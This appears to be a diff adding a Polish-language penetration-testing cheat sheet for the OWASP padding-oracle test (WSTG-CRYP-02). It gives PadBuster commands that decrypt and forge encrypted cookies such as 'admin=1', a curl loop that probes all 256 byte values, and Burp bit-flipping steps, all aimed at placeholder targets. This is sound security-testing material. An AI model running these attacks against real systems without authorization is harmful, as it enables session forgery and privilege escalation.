@@ -1,0 +1,68 @@
+================================================================================
+WSTG-CRYP-02 — Testing for Padding Oracle
+================================================================================
+CELE:
+- Zidentyfikowac zaszyfrowane wiadomosci z paddingiem (np. CBC mode)
+- Probowac zlamac padding w celu odszyfrowania/modyfikacji danych
+
+================================================================================
+KOMENDY
+================================================================================
+
+# --- PadBuster - automatyczny atak padding oracle ---
+# Przyklad: atak na zaszyfrowany cookie
+padbuster TARGET/page ENCRYPTED_COOKIE_VALUE 8 -cookies "auth=ENCRYPTED_COOKIE_VALUE"
+
+# --- PadBuster z blokiem 16 bajtow (AES) ---
+padbuster TARGET/page ENCRYPTED_VALUE 16
+
+# --- PadBuster - odszyfrowanie ---
+padbuster TARGET/page ENCRYPTED_VALUE 8 -plaintext "user=admin"
+
+# --- PadBuster - szyfrowanie nowej wartosci ---
+padbuster TARGET/page ENCRYPTED_VALUE 8 -plaintext "admin=1" -encoding 0
+
+# --- PadBuster z roznymi encodings ---
+# 0 = Base64, 1 = Lowercase HEX, 2 = Uppercase HEX, 3 = .NET URL Token, 4 = WebSafe Base64
+padbuster TARGET/page ENCRYPTED_VALUE 8 -encoding 0
+padbuster TARGET/page ENCRYPTED_VALUE 8 -encoding 1
+
+# --- curl - manualne testowanie roznic w odpowiedziach na padding ---
+# Prawidlowy padding (oryginalny ciphertext):
+curl -v TARGET/page -H "Cookie: token=VALID_ENCRYPTED_VALUE"
+
+# Zmodyfikowany ostatni bajt (zly padding):
+curl -v TARGET/page -H "Cookie: token=MODIFIED_ENCRYPTED_VALUE"
+
+# --- Porownanie odpowiedzi (czas, kod statusu, tresc) ---
+# Prawidlowy padding vs nieprawidlowy padding - roznice wskazuja na padding oracle
+for i in $(seq 0 255); do
+    HEX=$(printf '%02x' $i)
+    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}:%{time_total}" TARGET/page -H "Cookie: token=MODIFIED_${HEX}")
+    echo "Byte $HEX: $RESPONSE"
+done
+
+# --- Burp Intruder - bit-flipping atak ---
+# 1. Przechwytuj request z zaszyfrowanym parametrem
+# 2. Wyslij do Intruder
+# 3. Ustaw pozycje na ostatni blok ciphertextu
+# 4. Uzywaj Bit Flipper payload type
+# 5. Analizuj roznice w odpowiedziach
+
+================================================================================
+KOMENDY Z WORDLISTAMI
+================================================================================
+
+# --- Brak dedykowanych wordlist - atak oparty na kryptoanalizie ---
+
+================================================================================
+WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)
+================================================================================
+1. Zidentyfikuj zaszyfrowane wartosci w cookies, hidden fields, URL parametrach
+   (zwykle Base64 lub HEX, dlugosc podzielna przez 8 lub 16)
+2. W Burp Suite -> Repeater: zmien ostatni bajt ciphertextu i obserwuj odpowiedz
+3. Porownaj odpowiedzi: rozny blad (np. 500 vs 200 vs 403) wskazuje na padding oracle
+4. Zmierz czas odpowiedzi - roznice czasowe moga wskazywac na timing-based padding oracle
+5. Sprawdz czy aplikacja uzywa CBC mode (podatny na padding oracle)
+6. Sprawdz czy istnieje ViewState (ASP.NET) - czesty cel padding oracle
+7. Testuj rozne pozycje bitow w ciphertekscie dla potwierdzenia podatnosci
